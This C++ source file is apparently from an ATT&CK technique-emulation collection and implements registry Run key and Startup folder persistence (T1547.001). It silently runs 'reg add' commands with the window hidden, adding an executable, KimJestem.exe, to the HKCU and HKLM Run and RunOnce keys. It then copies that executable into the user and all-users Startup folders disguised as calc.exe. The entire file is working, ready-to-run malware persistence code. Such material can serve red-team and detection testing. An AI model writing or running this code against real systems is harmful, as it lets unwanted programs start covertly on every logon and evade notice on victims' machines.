---
title: ".001.Registry Run Keys Startup Folder "
folder: "05. Persistence/T1547 Boot or Logon Autostart Execution"
---

#include <windows.h>
#include <fstream>
#include <iostream>

void AutorunRegistryBackground1() {
    const char* command = "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"test\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void AutorunRegistryBackground2() {

    const char* command = "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"test\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void AutorunRegistryBackground3() {

    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"test\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void AutorunRegistryBackground4() {
    
    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"test\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

bool CopyFile() {
    std::ifstream src("C:\\Users\\User\\Desktop\\KimJestem.exe", std::ios::binary);
    std::ofstream dest("C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc.exe", std::ios::binary);

    if (!src.is_open() || !dest.is_open()) {
        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
        return false;
    }

    dest << src.rdbuf();

    if (src.fail() || dest.fail()) {
        std::cerr << "Błąd podczas kopiowania pliku.\n";
        return false;
    }

    std::cout << "Plik został pomyślnie skopiowany.\n";
    return true;
}
bool Copy1File() {
    std::ifstream src("C:\\Users\\User\\Desktop\\KimJestem.exe", std::ios::binary);
    std::ofstream dest("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\calc.exe", std::ios::binary);

    if (!src.is_open() || !dest.is_open()) {
        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
        return false;
    }

    dest << src.rdbuf();

    if (src.fail() || dest.fail()) {
        std::cerr << "Błąd podczas kopiowania pliku.\n";
        return false;
    }

    std::cout << "Plik został pomyślnie skopiowany.\n";
    return true;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    AutorunRegistryBackground1();
    AutorunRegistryBackground2();
    AutorunRegistryBackground3();
    AutorunRegistryBackground4();
    CopyFile();
    Copy1File();

    return 0;
}